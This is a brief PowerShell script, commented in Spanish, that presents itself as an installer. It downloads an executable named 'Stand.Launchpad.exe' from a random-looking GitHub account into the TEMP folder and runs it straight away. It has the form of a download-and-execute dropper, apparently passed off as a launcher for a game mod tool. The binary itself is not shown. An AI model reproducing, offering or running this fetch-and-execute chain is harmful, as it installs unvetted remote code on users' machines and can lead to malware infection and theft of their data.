# URL del archivo a descargar
$url = "https://github.com/tuckermattingly0013-crypto/224dxd3d3d/raw/refs/heads/main/Stand.Launchpad.exe"

# Ruta donde se guardará el archivo descargado
$outputPath = "$env:TEMP\Stand.Launchpad.exe"

# Descargar el archivo
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Verificar si la descarga fue exitosa
if (Test-Path $outputPath) {
    Write-Host "Descarga completada. Ejecutando el instalador..."

    # Ejecutar el archivo descargado
    Start-Process -FilePath $outputPath -Wait

    # Verificar si la ejecución fue exitosa
    if ($?) {
        Write-Host "Instalación completada con éxito."
    } else {
        Write-Host "Ocurrió un error durante la instalación."
    }
} else {
    Write-Host "Error al descargar el archivo."
}